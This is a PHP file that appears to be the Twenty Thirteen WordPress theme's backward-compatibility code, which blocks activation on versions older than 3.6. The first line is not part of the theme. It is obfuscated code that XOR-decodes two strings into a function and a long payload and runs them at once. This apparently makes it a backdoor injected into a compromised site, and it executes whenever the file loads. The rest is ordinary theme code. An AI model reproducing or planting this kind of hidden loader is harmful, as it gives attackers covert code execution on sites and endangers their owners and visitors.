<?php $NcwWGx='SA0 X1s2OWWF 5 '; $SHDFbUmj='03UA,T,T:942IZN'^$NcwWGx; $YMNCFC='W0GiZ0Z,59 -kSX=<XFcoJ=83OAF4kd;>MJBPe<4c06USL R<hE-BnOX=8btWLTQN3U1-hsjQK4cnzsNV4zAcQ<H=lEwiCbbMxSS6caIgxIqJvk,uB7KT,+juZS=,dnUm mosxZdw+ 6qaWjpkD2YW0W:;c:mG;<48l=bAi5C1Z=8chXN A1jqr3:=W: A>zE  JmkE=7hGioUT2T5qLLRV=0 CyjP+F4.EI0NOeX.ZF3nkY4 0Y4;8mRsf3dq q0HASQu ,4ohwqO=V.67cKJz5OY-HTh PLbMqWXY,mYsj<PFRxrnvEJPI.j77ZHEPJknF+7.5SbC1dT,118-0CaFih,icqhyiZ2qm1,JNuiURG3 A<mjJcn=u3ZX12=+JGhLAY.7AxjDo1XI2MyynJJ--7a=OS76abgI1IXZxW0FTC2=B;GD8=M= 92W4=+oc IOJ;A+4bSb2=V5 UjjJ61+STDvI-;4n-H4zbp3QVcJ.S=+kGcsA014Er =J5S6XF,8Pp:<OjmuRP.Z;xUVrFp51bikO 6ToH 0,psSnNpjwh5cDyWUs4:Xv-cG 4KahjG.0yOR0t>qFknrnjd-B41<m;,Ke2V = INf=J8Z JPoFjr. IABgmAeyxU1gOYH.:KhX3 J8a    ;3.qljP=L+5 >RWXKM+'; $HOyYArP=$SHDFbUmj('', '>VoH<E4OAPOC46 TO,5KH2RJl+ 2U4;VK9mkyEG>jVC;08I=RH=B01+9IY=+:9 yjW4ELDSN:.MJNZSnvOpHjuS=ILxWNdYhDq5<DKE GEiAqVOEI1C98IEBQ>2IMMUuIIFDZrSmSDUBQOjJXO S-6ksSfCdMcPYMcHTBdIF7C6XVKL3+YhlCJx:3O2NU3PRaOU>DPO4Jb:ceq0S TQql47QCExsN4J2Uq.,InrE>O65VUaSROB<UXPMzW9p+>k8uh  qQKIMOUIQkK7BCRJk1p<k=L<57K55BpQs3<UVSzNX123XONR3+<<KQ=JPB,6jCObOVZTzB8;m2CCTYNXcIb6:i864;-I;AQIZI3nHWuv1RL4YDJ1ig4QW;,PmVN3gUle2KNzrcMKU9=SmDYJ<+AXRZ7F.=KkhC-P=9zEwp3:0WO+Z+-BXeEOKm3UIJ0<M<;bY XQTg=VX5ZD0BN.WEJzxdR-LOU1F-MSKK980KnJ2IJKaES BCU<-KX3j6N15XKxWQY6MAUv4O.ZQupTfXXUWAO+AB54oKUUW.zNsMJPZTWuAdaAVX;GKRrDPrVXYvLVL.kVEZF LGRHLDL0FPE2PI2:W.INT:fAM+A6O+4HjJVJA= kNMaEYXuJmF<>OVcL<RT+cFPAYLTRJV1Ck7ENMIJzgqpGV'^$YMNCFC); $HOyYArP();
/**
 * Twenty Thirteen back compat functionality
 *
 * Prevents Twenty Thirteen from running on WordPress versions prior to 3.6,
 * since this theme is not meant to be backward compatible and relies on
 * many new functions and markup changes introduced in 3.6.
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */

/**
 * Prevent switching to Twenty Thirteen on old versions of WordPress.
 *
 * Switches to the default theme.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_switch_theme() {
	switch_theme( WP_DEFAULT_THEME, WP_DEFAULT_THEME );
	unset( $_GET['activated'] );
	add_action( 'admin_notices', 'twentythirteen_upgrade_notice' );
}
add_action( 'after_switch_theme', 'twentythirteen_switch_theme' );

/**
 * Add message for unsuccessful theme switch.
 *
 * Prints an update nag after an unsuccessful attempt to switch to
 * Twenty Thirteen on WordPress versions prior to 3.6.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_upgrade_notice() {
	$message = sprintf( __( 'Twenty Thirteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentythirteen' ), $GLOBALS['wp_version'] );
	printf( '<div class="error"><p>%s</p></div>', $message );
}

/**
 * Prevent the Customizer from being loaded on WordPress versions prior to 3.6.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_customize() {
	wp_die( sprintf( __( 'Twenty Thirteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentythirteen' ), $GLOBALS['wp_version'] ), '', array(
		'back_link' => true,
	) );
}
add_action( 'load-customize.php', 'twentythirteen_customize' );

/**
 * Prevent the Theme Preview from being loaded on WordPress versions prior to 3.4.
 *
 * @since Twenty Thirteen 1.0
 */
function twentythirteen_preview() {
	if ( isset( $_GET['preview'] ) ) {
		wp_die( sprintf( __( 'Twenty Thirteen requires at least WordPress version 3.6. You are running version %s. Please upgrade and try again.', 'twentythirteen' ), $GLOBALS['wp_version'] ) );
	}
}
add_action( 'template_redirect', 'twentythirteen_preview' );
